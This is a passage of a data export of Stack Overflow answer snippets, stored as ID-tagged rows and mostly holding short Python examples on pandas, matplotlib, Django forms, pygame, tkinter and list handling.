</snippet></ROW><ROW><id>20364522</id><snippet>None</snippet></ROW><ROW><id>20364522</id><snippet>Queue</snippet></ROW><ROW><id>20364522</id><snippet>None</snippet></ROW><ROW><id>20364522</id><snippet>return other is not None and self.container.__eq__(other.container)
</snippet></ROW><ROW><id>20364522</id><snippet>other</snippet></ROW><ROW><id>20364522</id><snippet>None</snippet></ROW><ROW><id>20364522</id><snippet>False</snippet></ROW><ROW><id>20364522</id><snippet>and</snippet></ROW><ROW><id>20364522</id><snippet>other</snippet></ROW><ROW><id>20364522</id><snippet>Queue</snippet></ROW><ROW><id>20364522</id><snippet>container</snippet></ROW><ROW><id>20364522</id><snippet>q = Queue([1,2,3])
q == 1
&gt;&gt;&gt; AttributeError: 'int' object has no attribute 'container'
</snippet></ROW><ROW><id>20364522</id><snippet>Queue</snippet></ROW><ROW><id>20364522</id><snippet>return other is not None and type(self) == type(other) and self.container.__eq__(other.container)
</snippet></ROW><ROW><id>20364522</id><snippet>None</snippet></ROW><ROW><id>20364522</id><snippet>NoneType</snippet></ROW><ROW><id>20364522</id><snippet>Queue</snippet></ROW><ROW><id>20364522</id><snippet>return type(self) == type(other) and self.container.__eq__(other.container)
</snippet></ROW><ROW><id>20364522</id><snippet>return type(self) == type(other) and self.container == other.container
</snippet></ROW><ROW><id>20364522</id><snippet>type</snippet></ROW><ROW><id>20364522</id><snippet>Queue</snippet></ROW><ROW><id>20364522</id><snippet>AttributeError</snippet></ROW><ROW><id>20364522</id><snippet>def __eq__(self, other):
    try:
        return self.container == other.container
    except AttributeError:
        return False    # There is no 'container' attribute, so can't be equal
    except:
        raise           # Another error occured, better pay it forward
</snippet></ROW><ROW><id>20364522</id><snippet>hasattr</snippet></ROW><ROW><id>20364522</id><snippet>return hasattr(other, 'container') and self.container == other.container
</snippet></ROW><ROW><id>20364794</id><snippet>&gt;&gt;&gt; b = [a[0]]
&gt;&gt;&gt; for item in a[1:]:
...     b.append(b[-1] + item)
... 
&gt;&gt;&gt; b
[1, 3, 6, 10, 15]
</snippet></ROW><ROW><id>20364794</id><snippet>itertools.accumulate</snippet></ROW><ROW><id>20364794</id><snippet>&gt;&gt;&gt; import itertools as it
&gt;&gt;&gt; a = [1, 2, 3, 4, 5]
&gt;&gt;&gt; list(it.accumulate(a))
[1, 3, 6, 10, 15]
</snippet></ROW><ROW><id>20364798</id><snippet>...
    self.tree.Bind(wx.EVT_TREE_SEL_CHANGED,self.OnTreeSelectionChange)
    self.tree.Bind(wx.EVT_KILL_FOCUS,self.OnKillTreeFocus)

...
def OnTreeSelectionChange(self, evt):
    print "OnSelChanged:   ", self.GetItemText(evt.GetItem())
</snippet></ROW><ROW><id>20364842</id><snippet>for step in [functionOne, functionTwo, ...]:
    step()
    if condition:
        conditionalFunction()
</snippet></ROW><ROW><id>20364875</id><snippet>.bash_profile</snippet></ROW><ROW><id>20364875</id><snippet>export PATH="/path/to/your/anaconda/bin:$PATH"
</snippet></ROW><ROW><id>20364875</id><snippet>alias pyconda='/path/to/your/anaconda/bin/python'
</snippet></ROW><ROW><id>20364875</id><snippet>pyconda</snippet></ROW><ROW><id>20364875</id><snippet>alias anacondainit='export PATH="/path/to/your/anaconda/bin:$PATH"'
</snippet></ROW><ROW><id>20364875</id><snippet>amorgan$ python # on a freshly opened terminal, this will load your default distro
Python 2.7.2 |EPD 7.2-1 (32-bit)| (default, Sep  7 2011, 09:16:50)
[GCC 4.0.1 (Apple Inc. build 5493)] on darwin
Type "packages", "demo" or "enthought" for more information.
&gt;&gt;&gt; exit()

amorgan$ anacondainit #initialize anaconda
amorgan$ python #now when we run python, it will load the anaconda distro
Python 2.7.6 |Anaconda 1.8.0 (x86_64)| (default, Nov 11 2013, 10:49:09)
[GCC 4.0.1 (Apple Inc. build 5493)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20365040</id><snippet>import random
from collections import defaultdict

def main():
    dice = int(input("Enter the number of dice: "))
    sides = int(input("Enter the number of sides: "))
    rolls = int(input("Enter the number of rolls to simulate: "))
    result = roll(dice, sides, rolls)
    maxH = 0
    for i in range(dice, dice * sides + 1):
        if result[i] / rolls &gt; maxH: maxH = result[i] / rolls
    for i in range(dice, dice * sides + 1):
        print('{:2d}{:10d}{:8.2%} {}'.format(i, result[i], result[i] / rolls, '#' * int(result[i] / rolls / maxH * 40)))


def roll(dice, sides, rolls):
    d = defaultdict(int)
    for _ in range(rolls):
        d[sum(random.randint(1, sides) for _ in range(dice))] += 1
    return d

main()
</snippet></ROW><ROW><id>20365203</id><snippet>import matplotlib.pyplot as plt
import numpy as np
import random

data = {}
data['dataset1'] = {}
data['dataset2'] = {}
data['dataset3'] = {}

n = 500
for k,v in data.iteritems():
    upper = random.randint(0, 1000)
    v['A'] = np.random.uniform(0, upper, size=n)
    v['B'] = np.random.uniform(0, upper, size=n)
    v['C'] = np.random.uniform(0, upper, size=n)

fig, axes = plt.subplots(ncols=3, sharey=True)
fig.subplots_adjust(wspace=0)

for ax, name in zip(axes, ['dataset1', 'dataset2', 'dataset3']):
    ax.boxplot([data[name][item] for item in ['A', 'B', 'C']])
    ax.set(xticklabels=['A', 'B', 'C'], xlabel=name)
    ax.margins(0.05) # Optional

plt.show()
</snippet></ROW><ROW><id>20365308</id><snippet>urllib</snippet></ROW><ROW><id>20365308</id><snippet>import urllib
from bs4 import BeautifulSoup as BS

url = '''https://archive.org/details/20070519_detroit2'''
#open and read page
page = urllib.urlopen(url)
html = page.read()
#create BeautifulSoup parse-able "soup"
soup = BS(html)
#get the src attribute from the video tag
video = soup.find("video").get("src")
</snippet></ROW><ROW><id>20365308</id><snippet>details</snippet></ROW><ROW><id>20365308</id><snippet>embed</snippet></ROW><ROW><id>20365308</id><snippet>https://archive.org/embed/20070519_detroit2
</snippet></ROW><ROW><id>20365308</id><snippet>url = '''https://archive.org/details/20070519_detroit2'''
spl = url.split('/')
spl[3] = 'embed'
embed = "/".join(spl)
print embed
</snippet></ROW><ROW><id>20365308</id><snippet>'''http://www.kumby.com/avatar-the-last-airbender-book-3-chapter-5/'''
</snippet></ROW><ROW><id>20365308</id><snippet>soup.find("iframe").get("src")
</snippet></ROW><ROW><id>20365308</id><snippet>iframe</snippet></ROW><ROW><id>20365308</id><snippet>.get("src")</snippet></ROW><ROW><id>20365431</id><snippet> def splitAppId(self, url):
        idMatch = re.search(r'/id([^/]+)\?[^/]*$', url)
        return idMatch.group(1)
</snippet></ROW><ROW><id>20365496</id><snippet>Main.py</snippet></ROW><ROW><id>20365496</id><snippet>bkg = pygame.image.load("Package/Resources/BKg.png").convert_alpha()
</snippet></ROW><ROW><id>20365496</id><snippet>bkg = pygame.image.load(os.path.join("Package","Resources","BKg.png")).convert_alpha()
</snippet></ROW><ROW><id>20365496</id><snippet>Resources</snippet></ROW><ROW><id>20365496</id><snippet>Package</snippet></ROW><ROW><id>20365496</id><snippet>Package</snippet></ROW><ROW><id>20365561</id><snippet>&gt;&gt;&gt; df = pd.DataFrame(np.random.randn(5,5))
&gt;&gt;&gt; df[df &lt; 0.1] = np.nan
&gt;&gt;&gt; df
          0         1         2         3         4
0       NaN  1.721657  0.446694       NaN  0.747747
1  1.178905  0.931979       NaN       NaN       NaN
2  1.547098       NaN       NaN       NaN  0.225014
3       NaN       NaN       NaN  0.886416  0.922250
4  0.453913  0.653732       NaN  1.013655       NaN

[5 rows x 5 columns]
&gt;&gt;&gt; movers = ~np.isnan(df.values)
&gt;&gt;&gt; df.values[movers] = np.random.permutation(df.values[movers])
&gt;&gt;&gt; df
          0         1         2         3         4
0       NaN  1.013655  1.547098       NaN  1.721657
1  0.886416  0.446694       NaN       NaN       NaN
2  1.178905       NaN       NaN       NaN  0.453913
3       NaN       NaN       NaN  0.747747  0.653732
4  0.922250  0.225014       NaN  0.931979       NaN

[5 rows x 5 columns]
</snippet></ROW><ROW><id>20365586</id><snippet>decimal_places</snippet></ROW><ROW><id>20365586</id><snippet>(max_digits - decimal_places)</snippet></ROW><ROW><id>20365586</id><snippet>DecimalField(max_digits=2,decimal_places=2)</snippet></ROW><ROW><id>20365586</id><snippet>DecimalField(max_digits=11,decimal_places=8)</snippet></ROW><ROW><id>20365586</id><snippet>max_digits</snippet></ROW><ROW><id>20365696</id><snippet>class X():
    def __init__(self, a=None):
        self.a = [] if a is None else a
</snippet></ROW><ROW><id>20365696</id><snippet>class X():
    def __init__(self,a=[]):
        print(id(a))

k = X([1,2,3])
g = X([1,2,4])   # &lt;- different list values
t = X()
h = X()
</snippet></ROW><ROW><id>20365696</id><snippet>42678232
42678232
42680152
42680152
</snippet></ROW><ROW><id>20365703</id><snippet>decimal</snippet></ROW><ROW><id>20365703</id><snippet>from decimal import Decimal
x = Decimal('0.0000000001')
y = Decimal('-0.00000000001')
</snippet></ROW><ROW><id>20365707</id><snippet>Response</snippet></ROW><ROW><id>20365707</id><snippet>JSONResponse</snippet></ROW><ROW><id>20365707</id><snippet>Response</snippet></ROW><ROW><id>20365707</id><snippet>jsonify()</snippet></ROW><ROW><id>20365707</id><snippet>JSONResponse</snippet></ROW><ROW><id>20365707</id><snippet>after_request</snippet></ROW><ROW><id>20365707</id><snippet>JSONResponse</snippet></ROW><ROW><id>20365707</id><snippet>render()</snippet></ROW><ROW><id>20365707</id><snippet>jsonify()</snippet></ROW><ROW><id>20365827</id><snippet>frame</snippet></ROW><ROW><id>20365827</id><snippet>self.frame</snippet></ROW><ROW><id>20365827</id><snippet>frame</snippet></ROW><ROW><id>20365827</id><snippet>__init__</snippet></ROW><ROW><id>20365827</id><snippet>self.frame</snippet></ROW><ROW><id>20365827</id><snippet>self</snippet></ROW><ROW><id>20366097</id><snippet>data = ['08.10.17','D','520','08.11.01','W','20']
for date, type, amount in zip(data[0::3], data[1::3], data[2::3]):
    print date, type, amount
</snippet></ROW><ROW><id>20366097</id><snippet>08.10.17 D 520
08.11.01 W 20
</snippet></ROW><ROW><id>20366097</id><snippet>def convert(stuff):
    it = iter(stuff)
    return zip(it, it, it)

for date, type, amount in convert(data):
    print date, type, amount
</snippet></ROW><ROW><id>20366127</id><snippet>action = ""
if action == "stat": # Not true, action == ""
    # stuff
elif action == "list": # Not true, action == ""
    # stuff
elif action == "retr": # Not true, action == ""
    # stuff
else: # Looks like this is where we will end up
    exit()
</snippet></ROW><ROW><id>20366127</id><snippet>action = ""</snippet></ROW><ROW><id>20366127</id><snippet>NameError</snippet></ROW><ROW><id>20366127</id><snippet>action</snippet></ROW><ROW><id>20366127</id><snippet>action = a_function_that_gets_info_from_user_and_returns_a_string()
</snippet></ROW><ROW><id>20366127</id><snippet>action</snippet></ROW><ROW><id>20366127</id><snippet>if</snippet></ROW><ROW><id>20366133</id><snippet>type</snippet></ROW><ROW><id>20366133</id><snippet>class base: pass
classNames = ["class1", "class2", "class3", "class4"]
classes = [type(name, (base,), {}) for name in classNames]
</snippet></ROW><ROW><id>20366222</id><snippet>class Block(pygame.sprite.Sprite):
    def __init__(self, pos):

        #make it a sprite
        pygame.sprite.Sprite.__init__(self)

        #create a rect at position (pos) that is 25 by 25 pixels
        self.image = pygame.Rect(pos[0], pos[1] 25, 25)

        #make the rect a class variable that can be moved
        self.rect = self.image.get_rect()

   def update(self):
       #move rect 20 pixels each update (can be adjusted)
       self.rect.y += 20
       #if it goes to to the bottom of the screen delete it
       if self.rect.y &gt; screen_height:
           self.kill()
</snippet></ROW><ROW><id>20366222</id><snippet>block = Block([20, 20])
</snippet></ROW><ROW><id>20366222</id><snippet>block.update()
block.draw()
</snippet></ROW><ROW><id>20366222</id><snippet>block_list = pygame.sprite.Group()
for i in xrange(10):
    block = Block([i,i])
    block_list.add(block)
</snippet></ROW><ROW><id>20366222</id><snippet>block_list.draw()
block_list.update()
</snippet></ROW><ROW><id>20366256</id><snippet>QDialog</snippet></ROW><ROW><id>20366256</id><snippet>QWidget</snippet></ROW><ROW><id>20366256</id><snippet>accept()</snippet></ROW><ROW><id>20366256</id><snippet>reject()</snippet></ROW><ROW><id>20366256</id><snippet>setupUi</snippet></ROW><ROW><id>20366256</id><snippet>self.cancelButton.clicked.connect(self.reject) # Clicked cancel
self.okButton.clicked.connect(self.accept)  #Clicked accept
</snippet></ROW><ROW><id>20366256</id><snippet>def whichItem():
    selector = SelectorDialog(parent)
    if selector.exec_() == QtGui.QDialog.Accepted:
        picks = selector.getPicks()
</snippet></ROW><ROW><id>20366256</id><snippet>Class SelectorDialog(QtGui.QDialog):
    ...
    def getPicks(self):
        picked = []
        for item in self.listWidget.selectedItems():
            picked.append(str(item.text()))
        return picked
</snippet></ROW><ROW><id>20366386</id><snippet>SECURITY_{REGISTER,LOGIN}_USER_TEMPLATE</snippet></ROW><ROW><id>20366386</id><snippet>SECURITY_REGISTER_USER_TEMPLATE='index.html'</snippet></ROW><ROW><id>20366472</id><snippet>Preferences -&gt; Package Settings -&gt; SublimeREPL -&gt; Settings - Default</snippet></ROW><ROW><id>20366472</id><snippet>"show_transferred_text": false</snippet></ROW><ROW><id>20366472</id><snippet>false</snippet></ROW><ROW><id>20366472</id><snippet>In [#]</snippet></ROW><ROW><id>20366472</id><snippet>true</snippet></ROW><ROW><id>20366472</id><snippet>Preferences -&gt; Package Settings -&gt; SublimeREPL -&gt; Settings - User</snippet></ROW><ROW><id>20366472</id><snippet>In [#]</snippet></ROW><ROW><id>20366472</id><snippet>x</snippet></ROW><ROW><id>20366472</id><snippet>y</snippet></ROW><ROW><id>20366946</id><snippet>__init__</snippet></ROW><ROW><id>20366946</id><snippet>class MyModelForm(forms.ModelForm):
    created_on = forms.DateField(widget=forms.DateInput(attrs={'readonly': 'readonly'}))

    def __init__(self, *args, **kwargs):
        super(MyModelForm, self).__init__(*args, **kwargs)

        if self.instance:
            if not self.initial.get('created_on'):
                self.initial['created_on'] = self.instance.created_on

    class Meta:
        model = MyModel
        fields = ('field1', 'field2', 'etc', 'created_on')
</snippet></ROW><ROW><id>20367378</id><snippet>&lt;?php

  $url = "http://www.kumby.com/avatar-the-last-airbender-book-3-chapter-5/";
  $page = new DOMDocument;
  $page-&gt;loadHTML(file_get_contents($url));
  foreach ($page-&gt;getElementsByTagName('iframe') as $node) {
    echo $node-&gt;getAttribute('src');
  }

?&gt;
</snippet></ROW><ROW><id>20367494</id><snippet>for i in range(2, l + 1):
    replace_index = "//form[@id='SubAvailSelectForm']/font/table[2]/tbody/tr[%d]/td[1]/small" % (i,)
    job_count_array[replace_index] = sel.get_text(replace_index)
</snippet></ROW><ROW><id>20367494</id><snippet>replace_index</snippet></ROW><ROW><id>20367494</id><snippet>for i in range(2, l + 1):
    replace_index = ("//form[@id='SubAvailSelectForm']/"
                     "font/table[2]/tbody/tr[%d]/td[1]/small") % (i,)
    job_count_array[replace_index] = sel.get_text(replace_index)
</snippet></ROW><ROW><id>20367494</id><snippet>(%i,)</snippet></ROW><ROW><id>20367494</id><snippet>%i</snippet></ROW><ROW><id>20367536</id><snippet>significant_other = signficant_other.append(new_spouse)
</snippet></ROW><ROW><id>20367536</id><snippet>significant_other.append(new_spouse)
</snippet></ROW><ROW><id>20367536</id><snippet>None</snippet></ROW><ROW><id>20367536</id><snippet>&gt;&gt;&gt; a = []
&gt;&gt;&gt; b = a.append(5)
&gt;&gt;&gt; print b
None
</snippet></ROW><ROW><id>20367536</id><snippet>signficant_other.append(new_spouse)</snippet></ROW><ROW><id>20367536</id><snippet>significant</snippet></ROW><ROW><id>20367536</id><snippet>signficant</snippet></ROW><ROW><id>20367615</id><snippet>pass</snippet></ROW><ROW><id>20367615</id><snippet>if response == "yes":
    pass  # process "yes" case
</snippet></ROW><ROW><id>20367615</id><snippet>continue</snippet></ROW><ROW><id>20367615</id><snippet>for i in range(10):
    if i % 2 == 0:
        continue
    print i
</snippet></ROW><ROW><id>20367615</id><snippet>continue</snippet></ROW><ROW><id>20367615</id><snippet>for</snippet></ROW><ROW><id>20367615</id><snippet>i</snippet></ROW><ROW><id>20367615</id><snippet>for</snippet></ROW><ROW><id>20367615</id><snippet>for i in range(10):
    pass
for i in range(10):
    continue
</snippet></ROW><ROW><id>20367646</id><snippet>list2</snippet></ROW><ROW><id>20367646</id><snippet>list2 = list(list1)
</snippet></ROW><ROW><id>20367646</id><snippet>[1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
[]
</snippet></ROW><ROW><id>20367786</id><snippet>v2 = np.sum(((b1 - m1) ** 2 * \
        np.sum(((b2 - np.sum(((b2 - m2) ** 2) * p2) / q2) ** 2) * p2) \
                                                                / q2) * p1)
</snippet></ROW><ROW><id>20367786</id><snippet>v2 = np.sum(((b1 - m1) ** 2 *
        np.sum(((b2 - np.sum(((b2 - m2) ** 2) * p2) / q2) ** 2) * p2)
                                                                / q2) * p1)
</snippet></ROW><ROW><id>20367821</id><snippet>Post.query.filter(Post.title.ilike('%some_phrase%'))
</snippet></ROW><ROW><id>20368634</id><snippet>&gt;&gt;&gt; group = df.groupby(['Date','AccessType']).sum()
&gt;&gt;&gt; temp = group.unstack()
&gt;&gt;&gt; temp = temp.replace('nan',0)
&gt;&gt;&gt; temp = temp1.stack()
&gt;&gt;&gt; df = temp.reset_index()
</snippet></ROW><ROW><id>20368652</id><snippet>(row[0] + row[1])</snippet></ROW><ROW><id>20368652</id><snippet>list(itertools.chain.from_iterable(row))
</snippet></ROW><ROW><id>20368652</id><snippet>[item for sublist in row for item in sublist]
</snippet></ROW><ROW><id>20369013</id><snippet>Remarks

The GetTcpTable2 function is defined on Windows Vista and later. 
</snippet></ROW><ROW><id>20369136</id><snippet>def remove_empty(l):
    return tuple(filter(lambda x:not isinstance(x, (str, list, tuple)) or x, (remove_empty(x) if isinstance(x, (tuple, list)) else x for x in l)))
</snippet></ROW><ROW><id>20369984</id><snippet>yaml.safe_dump(data, file(filename,'w'), encoding='utf-8', allow_unicode=True)
</snippet></ROW><ROW><id>20370166</id><snippet>entryconfigure()</snippet></ROW><ROW><id>20370166</id><snippet>1</snippet></ROW><ROW><id>20370166</id><snippet>from tkinter import *

root = Tk()
menu_bar = Menu(root)

def clicked(menu):
    menu.entryconfigure(1, label="Clicked!")

file_menu = Menu(menu_bar, tearoff=False)
file_menu.add_command(label="An example item", command=lambda: clicked(file_menu))
menu_bar.add_cascade(label="File", menu=file_menu)

root.config(menu=menu_bar)
root.mainloop()
</snippet></ROW><ROW><id>20370311</id><snippet>m1()</snippet></ROW><ROW><id>20370311</id><snippet>x=m1()</snippet></ROW><ROW><id>20370311</id><snippet>m1()</snippet></ROW><ROW><id>20370311</id><snippet>if chck in ["Yes","yes","Y","y"]:</snippet></ROW><ROW><id>20370386</id><snippet>all()</snippet></ROW><ROW><id>20370386</id><snippet>if all(i in abrindo for i in palavras_chaves):
    print '\nÉ um joomla!'

elif all(i in abrindo for i in palavras_chaves2):
    print '\nÉ um wordpress!'
else:
    print '\nÉ um CMS desconhecido!'
</snippet></ROW><ROW><id>20370386</id><snippet>if palavras_chaves[0] and palavras_chaves[1] in abrindo:
</snippet></ROW><ROW><id>20370386</id><snippet>palavras_chaves[1]</snippet></ROW><ROW><id>20370386</id><snippet>abrindo</snippet></ROW><ROW><id>20370386</id><snippet>palavras_chaves[0]</snippet></ROW><ROW><id>20370386</id><snippet>abrindo</snippet></ROW><ROW><id>20370386</id><snippet>all()</snippet></ROW><ROW><id>20370386</id><snippet>palavras_chaves</snippet></ROW><ROW><id>20370386</id><snippet>abrindo</snippet></ROW><ROW><id>20370386</id><snippet>abrindo</snippet></ROW><ROW><id>20370386</id><snippet>'Works as expected'</snippet></ROW><ROW><id>20370386</id><snippet>&gt;&gt;&gt; if 'Hey' and 'Bye' in 'Bye':
...     print 'Not expected right?'
... else:
...     print 'Works as expected'
...     
#Not expected right?
</snippet></ROW><ROW><id>20370386</id><snippet>all()</snippet></ROW><ROW><id>20370386</id><snippet>if all(i in 'Bye'for i in ['Hey','Bye']):
    print 'Not expected right?'
else:
    print 'Works as expected'
#Works as expected
</snippet></ROW><ROW><id>20370408</id><snippet># define "start" somewhere

cnx = mysql.connector.connect(host=mysql_host, user=mysql_localhost_user, password=mysql_localhost_password, database=mysql_localhost_database)
cursor = cnx.cursor()
cursor.execute("SELECT url FROM masjid where ID =" + str(start) )
results2 = cursor.fetchone()
cursor.close()
cnx.close()
if results2 is not None:
    masjid_url = results2[0]
    content1 = urllib2.urlopen(masjid_url).read()
else:
    print('No record matches the ID "%s" or no URL available for this ID'%(start))
</snippet></ROW><ROW><id>20370457</id><snippet># create Series with dictionaries
&gt;&gt;&gt; from collections import Counter
&gt;&gt;&gt; c = df["path"].str.split(',').apply(Counter)
&gt;&gt;&gt; c
0    {u'p2': 1, u'p3': 1, u'p1': 1, u'p4': 1}
1                        {u'p2': 1, u'p1': 2}
2              {u'p1': 1, u'p7': 1, u'p5': 2}
3              {u'p2': 1, u'p3': 2, u'p1': 1}

# create DataFrame
&gt;&gt;&gt; pd.DataFrame({n: c.apply(lambda x: x.get(n, 0)) for n in wordlist})
   p1  p2  p3  p4  p5  p6  p7
0   1   1   1   1   0   0   0
1   2   1   0   0   0   0   0
2   1   0   0   0   2   0   1
3   1   1   2   0   0   0   0
</snippet></ROW><ROW><id>20370457</id><snippet>&gt;&gt;&gt; dfN = df["path"].str.split(',').apply(lambda x: pd.Series(Counter(x)))
&gt;&gt;&gt; pd.DataFrame(dfN, columns=wordlist).fillna(0)
   p1  p2  p3  p4  p5  p6  p7
0   1   1   1   1   0   0   0
1   2   1   0   0   0   0   0
2   1   0   0   0   2   0   1
3   1   1   2   0   0   0   0
</snippet></ROW><ROW><id>20370457</id><snippet>&gt;&gt;&gt; dfL = pd.concat([df]*100)
&gt;&gt;&gt; timeit('c = dfL["path"].str.split(",").apply(Counter); d = pd.DataFrame({n: c.apply(lambda x: x.get(n, 0)) for n in wordlist})', 'from __main__ import dfL, wordlist; import pandas as pd; from collections import Counter', number=100)
0.7363274283027295

&gt;&gt;&gt; timeit('splitted = dfL["path"].str.split(","); d = pd.DataFrame({name : splitted.apply(lambda x: x.count(name)) for name in wordlist})', 'from __main__ import dfL, wordlist; import pandas as pd', number=100)
0.5305424618886718

# now let's make wordlist larger
&gt;&gt;&gt; wordlist = wordlist + list(lowercase) + list(uppercase)

&gt;&gt;&gt; timeit('c = dfL["path"].str.split(",").apply(Counter); d = pd.DataFrame({n: c.apply(lambda x: x.get(n, 0)) for n in wordlist})', 'from __main__ import dfL, wordlist; import pandas as pd; from collections import Counter', number=100)
1.765344003293876

&gt;&gt;&gt; timeit('splitted = dfL["path"].str.split(","); d = pd.DataFrame({name : splitted.apply(lambda x: x.count(name)) for name in wordlist})', 'from __main__ import dfL, wordlist; import pandas as pd', number=100)
2.33328927599905
</snippet></ROW><ROW><id>20370457</id><snippet>Counter</snippet></ROW><ROW><id>20370457</id><snippet>defaultdict</snippet></ROW><ROW><id>20370457</id><snippet>&gt;&gt;&gt; def create_dict(x):
...     d = defaultdict(int)
...     for c in x:
...         d[c] += 1
...     return d
&gt;&gt;&gt; c = df["path"].str.split(",").apply(create_dict)
&gt;&gt;&gt; pd.DataFrame({n: c.apply(lambda x: x[n]) for n in wordlist})
   p1  p2  p3  p4  p5  p6  p7
0   1   1   1   1   0   0   0
1   2   1   0   0   0   0   0
2   1   0   0   0   2   0   1
3   1   1   2   0   0   0   0
</snippet></ROW><ROW><id>20370457</id><snippet>&gt;&gt;&gt; timeit('c = dfL["path"].str.split(",").apply(create_dict); d = pd.DataFrame({n: c.apply(lambda x: x[n]) for n in wordlist})', 'from __main__ import dfL, wordlist, create_dict; import pandas as pd; from collections import defaultdict', number=100)
0.45942801555111146

# now let's make wordlist larger
&gt;&gt;&gt; wordlist = wordlist + list(lowercase) + list(uppercase)
&gt;&gt;&gt; timeit('c = dfL["path"].str.split(",").apply(create_dict); d = pd.DataFrame({n: c.apply(lambda x: x[n]) for n in wordlist})', 'from __main__ import dfL, wordlist, create_dict; import pandas as pd; from collections import defaultdict', number=100)
1.5798653213942089
</snippet></ROW><ROW><id>20370740</id><snippet>wstring result</snippet></ROW><ROW><id>20370740</id><snippet>result.c_str()</snippet></ROW><ROW><id>20370740</id><snippet>free</snippet></ROW><ROW><id>20371140</id><snippet>import matplotlib.pyplot as plt

fig, host = plt.subplots()
fig.subplots_adjust(right=0.75)

par1 = host.twinx()
par2 = host.twinx()

# move the spine of the second axes outwards
par2.spines["right"].set_position(("axes", 1.2))

p1, = host.plot([0, 1, 2], [0, 1, 2], 'r-', label="Density")
p2, = par1.plot([0, 1, 2], [0, 3, 2], 'g-', label="Temperature")
p3, = par2.plot([0, 1, 2], [50, 30, 15], 'b-', label="Velocity")

host.set_xlim(0, 2)
host.set_ylim(0, 2)
par1.set_ylim(0, 4)
par2.set_ylim(1, 65)

host.set_xlabel("Distance")
host.set_ylabel("Density")
par1.set_ylabel("Temperature")
par2.set_ylabel("Velocity")

lines = [p1, p2, p3]
host.legend(lines, [l.get_label() for l in lines])

for ax in [par1, par2]:
    ax.set_frame_on(True)
    ax.patch.set_visible(False)

    plt.setp(ax.spines.values(), visible=False)
    ax.spines["right"].set_visible(True)

host.yaxis.label.set_color(p1.get_color())
par1.yaxis.label.set_color(p2.get_color())
par2.yaxis.label.set_color(p3.get_color())

par1.spines["right"].set_edgecolor(p2.get_color())
par2.spines["right"].set_edgecolor(p3.get_color())

host.tick_params(axis='y', colors=p1.get_color())
par1.tick_params(axis='y', colors=p2.get_color())
par2.tick_params(axis='y', colors=p3.get_color())
</snippet></ROW><ROW><id>20371706</id><snippet>class AllFuncs(MyFuncs, MyFuncs2):
    pass

server.register_instance(AllFuncs)
</snippet></ROW><ROW><id>20371829</id><snippet>import re

def get_numbers(value):
    value = re.sub(r'^(\d+)$', r'\1-\1', value) # '88' -&gt; '88-88'
    start, stop = map(int, re.findall(r'\d+', value))
    return range(start, stop+1)

print get_numbers('88-94')
print get_numbers('88 to 94')
print get_numbers('88')
</snippet></ROW><ROW><id>20371829</id><snippet>[88, 89, 90, 91, 92, 93, 94]
[88, 89, 90, 91, 92, 93, 94]
[88]
</snippet></ROW><ROW><id>20372241</id><snippet>TextInput</snippet></ROW><ROW><id>20372241</id><snippet>class CharsLeftInput(forms.TextInput):                             
    def render(self, name, value, attrs=None):
        if value is None:
            value = ''
        final_attrs = self.build_attrs(attrs, type=self.input_type, name=name)
        if value != '':
            final_attrs['value'] = force_unicode(self._format_value(value))
        maxlength = final_attrs.get('maxlength',False)
        if not maxlength:
            return mark_safe(u'&lt;input%s /&gt;'%flatatt(final_attrs))
        current = force_unicode(int(maxlength) - len(value))
        html = u"""
            &lt;span class="charsleft charsleft-input"&gt;
            &lt;input %(attrs)s /&gt; 
            &lt;span&gt;&lt;span class="count"&gt;%(current)s&lt;/span&gt; characters remaining&lt;/span&gt;
            &lt;span class="maxlength"&gt;%(maxlength)s&lt;/span&gt;
            &lt;/span&gt;
        """ % { 
            'attrs':flatatt(final_attrs),
            'current':current,
            'maxlength':int(maxlength),
        }
        return mark_safe(html)

    class Media:
        css = {'screen':('charsleft-widget/css/charsleft.css',),}
        js = ('charsleft-widget/js/charsleft.js',)
</snippet></ROW><ROW><id>20372241</id><snippet>jQuery(function($){
    $.fn.charsLeft = function(options){
        var defaults = {        
            'source':'input',
            'dest':'.count',
        }
        var options = $.extend(defaults, options);

        var calculate = function(source, dest, maxlength){
            var remaining = maxlength - source.val().length;
            dest.html(remaining);
            /* Over 50%, change colour to orange */
            p=(100*remaining)/maxlength;
            if(p&lt;25){
                dest.addClass('orange');
            }else if(p&lt;50){
                dest.addClass('red');
            }else{
                dest.removeClass('orange red');
            }
        };

        this.each(function(i, el) {
            var maxlength = $(this).find('.maxlength').html();
            var dest = $(this).find(options.dest);
            var source = $(this).find(options.source);
            source.keyup(function(){
                calculate(source, dest, maxlength)
            });
            source.change(function(){
                calculate(source, dest, maxlength)
            });
        });
    };

    $(".charsleft-input").charsLeft({
            'source':'input',
            'dest':".count",
    });
});
</snippet></ROW><ROW><id>20372241</id><snippet>CharField</snippet></ROW><ROW><id>20372241</id><snippet>from django.contrib import admin
from widgets import CharsLeftInput

class TestForm(forms.Form):
    field_one = forms.CharField(widget=CharsLeftInput())
    ....

class TestAdmin(admin.ModelAdmin):
    form = TestForm
</snippet></ROW><ROW><id>20372325</id><snippet>actual_ans_dict</snippet></ROW><ROW><id>20372325</id><snippet>actual_ans_dict[data[0]]</snippet></ROW><ROW><id>20372325</id><snippet>actual_ans_dict</snippet></ROW><ROW><id>20372325</id><snippet>actual_ans_dict = {}
for data in prsnobj.result:
    actual_ans_dict[data[0]] = data[1]
    print actual_ans_dict
</snippet></ROW><ROW><id>20372535</id><snippet>list_intersection = [item for item in List1 if item in List2]
</snippet></ROW><ROW><id>20372535</id><snippet>List1</snippet></ROW><ROW><id>20372535</id><snippet>List2</snippet></ROW><ROW><id>20372535</id><snippet>list_intersection</snippet></ROW><ROW><id>20372535</id><snippet>set1.intersection( set2 )</snippet></ROW><ROW><id>20372535</id><snippet>l1 = [ 1, 1, 2, 3 ]
l2 = [ 2, 3, 4, 3 ]
l3 = set( l1 ).intersection( set( l2 ) )
l3 = list( l3 )
</snippet></ROW><ROW><id>20372535</id><snippet>l3</snippet></ROW><ROW><id>20372535</id><snippet>[2, 3]</snippet></ROW><ROW><id>20372645</id><snippet>print</snippet></ROW><ROW><id>20372645</id><snippet>end='\n'</snippet></ROW><ROW><id>20372645</id><snippet>end=''</snippet></ROW><ROW><id>20372645</id><snippet>print()</snippet></ROW><ROW><id>20372645</id><snippet>def a(n):
    print('*' * n)
    for i in range(n - 2):
        print('*' + ' ' * (n - 2) + '*')
    if n &gt; 1:
        print('*' * n) 
</snippet></ROW><ROW><id>20373044</id><snippet>def singleton(cls):
    return cls()

